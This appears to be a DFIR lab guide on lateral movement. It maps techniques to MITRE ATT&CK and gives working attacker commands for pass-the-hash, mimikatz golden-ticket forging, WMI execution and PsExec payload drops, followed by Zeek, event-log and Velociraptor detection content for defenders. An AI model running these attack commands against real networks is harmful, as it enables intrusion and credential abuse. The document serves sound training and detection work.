# Attack Scenario: Lateral Movement

## MITRE ATT&CK Mapping

| Tactic            | Technique                               | ID         |
|-------------------|-----------------------------------------|------------|
| Lateral Movement  | Remote Services: SMB/Windows Admin Shares | T1021.002 |
| Lateral Movement  | Remote Services: Remote Desktop Protocol  | T1021.001 |
| Lateral Movement  | Use Alternate Authentication Material: PtH | T1550.002 |
| Lateral Movement  | Use Alternate Authentication Material: PtT | T1550.003 |
| Discovery         | Network Share Discovery                    | T1135     |
| Discovery         | Remote System Discovery                    | T1018     |

---

## Scenario 1: Pass-the-Hash (PtH) via SMB

```bash
# On attacker — using captured NTLM hash
crackmapexec smb 10.10.10.0/24 \
  -u Administrator \
  -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' \
  --shares

# Execute command via PtH
crackmapexec smb 10.10.10.31 \
  -u Administrator \
  -H '<NT_HASH>' \
  -x "whoami /all"

# Drop a shell via Impacket
psexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' \
  Administrator@10.10.10.31
```

---

## Scenario 2: Pass-the-Ticket (Kerberos)

```powershell
# Export TGTs from current session
mimikatz # kerberos::list /export

# Inject a golden ticket
mimikatz # kerberos::golden \
  /user:Administrator \
  /domain:dfir.lab \
  /sid:S-1-5-21-XXXXXXXX \
  /krbtgt:<KRBTGT_HASH> \
  /ticket:golden.kirbi

mimikatz # kerberos::ptt golden.kirbi
```

---

## Scenario 3: WMI Remote Execution

```cmd
# Lateral movement via WMIC
wmic /node:10.10.10.31 \
  /user:DFIR\Administrator \
  /password:Password123! \
  process call create "cmd.exe /c whoami > C:\Temp\out.txt"
```

```python
# Impacket WMI exec
wmiexec.py dfir.lab/Administrator:Password123!@10.10.10.31 "cmd.exe"
```

---

## Scenario 4: SMB Named Pipe (PsExec style)

```bash
psexec.py dfir.lab/Administrator:Password123!@10.10.10.31 -c /tmp/payload.exe
```

---

## Network Detection (Zeek)

```bash
# Suspicious SMB activity
grep -E "IPC\$|ADMIN\$|C\$" /opt/zeek/logs/current/smb_files.log | \
  jq '{ts,id_orig_h,id_resp_h,path,name,action}'

# Kerberos anomalies
cat /opt/zeek/logs/current/kerberos.log | \
  jq 'select(.request_type=="AS") | {ts,client,service,success}'
```

---

## Windows Forensic Artifacts

| Artifact          | Description                            | Location |
|-------------------|----------------------------------------|----------|
| Event ID 4624/4625| Logon Success/Failure                 | Security.evtx |
| Event ID 4648     | Explicit Credential Logon (Runas)     | Security.evtx |
| Event ID 4776     | NTLM Auth Attempt                     | Security.evtx |
| Event ID 5140     | Network Share Accessed                | Security.evtx |
| Named Pipe logs   | Sysmon Event ID 17/18                 | Sysmon.evtx |

---

## Velociraptor Lateral Movement Hunt

```sql
-- Find network logons to sensitive shares
SELECT EventTime, Computer, TargetUserName, IpAddress, ShareName
FROM artifact_results(artifact='Windows.EventLogs.Authentication')
WHERE LogonType = 3
  AND ShareName =~ '(ADMIN|IPC|C)\$'
  AND NOT IpAddress = '127.0.0.1'

-- Find SMB lateral movement via PsExec artifacts
SELECT * FROM artifact_results(
  artifact='Windows.Detection.PsExec')
```
